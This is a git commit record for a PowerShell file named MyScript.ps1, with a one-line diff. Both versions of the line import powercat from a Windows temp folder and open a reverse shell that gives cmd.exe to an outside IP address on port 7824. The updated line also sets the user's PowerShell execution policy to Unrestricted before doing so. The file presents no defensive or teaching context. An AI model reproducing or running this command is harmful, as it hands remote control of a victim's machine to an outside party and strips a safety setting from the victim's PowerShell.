d34e9e3feb44c30bf90bda391f28c4edc0e31011
3d3aqfva <85192942+3d3aqfva@users.noreply.github.com>
2021-06-04 00:05:19 +0100

    Update MyScript.ps1

--- MyScript.ps1
+++ MyScript.ps1
@@ -1,1 +1,1 @@
-import-module C:\Windows\temp\powercat.ps1; powercat -c 52.177.120.185 -p 7824 -e cmd.exe
+Set-ExecutionPolicy Unrestricted -Scope CurrentUser;import-module C:\Windows\temp\powercat.ps1; powercat -c 52.177.120.185 -p 7824 -e cmd.exe
